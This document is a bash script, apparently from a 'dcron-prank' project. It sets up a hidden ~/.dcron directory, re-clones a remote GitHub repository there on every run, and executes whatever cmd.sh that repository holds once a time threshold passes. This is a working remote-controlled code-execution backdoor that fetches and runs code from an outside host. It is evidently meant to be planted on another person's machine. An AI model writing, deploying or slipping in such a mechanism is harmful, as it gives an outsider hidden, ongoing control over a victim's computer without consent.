#!/bin/bash

#git clone https://github.com/TennisGazelle/dcron-prank
DEBUG=1
NOW=$(date +"%s")

function debug_echo() {
	if [[ $DEBUG -eq 1 ]]; then
		echo "[DEBUG] - " $1
	fi
}

mkdir -p ~/.dcron
cd ~/.dcron
rm -rf dcron && git clone https://github.com/TennisGazelle/dcron --quiet

cp dcron/cmd.sh .
cp dcron/dcron-start.sh .
cp dcron/.dcron.* .

## READ IN PARAMETERS
if [[ -f '.dcron.lastrun' ]]; then
	debug_echo 'reading .dcron.lastrun'
	LAST_RUN=$(date -j -f "%s" "$(cat .dcron.lastrun)" "+%s")
fi

if [[ ! -f '.dcron.timelimit' ]]; then
	debug_echo 'defaulting .dcron.timelimit to 10'
	echo 10 > .dcron.timelimit
fi

TIME_DIFF=$(((NOW-LAST_RUN)))
TIME_LIMIT=$(cat .dcron.timelimit)

## CHECK IF TIME THRESHOLD IS MET
if [[ TIME_DIFF -gt TIME_LIMIT ]]; then
	debug_echo 'time limit passed, resetting NOW in file'
	echo $NOW > .dcron.lastrun

	# EXECUTE FILE IF APPLICABLE
	if [[ -f 'cmd.sh' ]]; then
		debug_echo 'executing cmd'
		chmod +x ./cmd.sh
		./cmd.sh
		chmod -x ./cmd.sh
	else
		debug_echo 'cmd.sh not found!'
	fi
else
	debug_echo "time diff only at $TIME_DIFF, wait for $TIME_LIMIT"
fi

cd -

#execute what's in the cmd
#echo 'executing cmd.sh'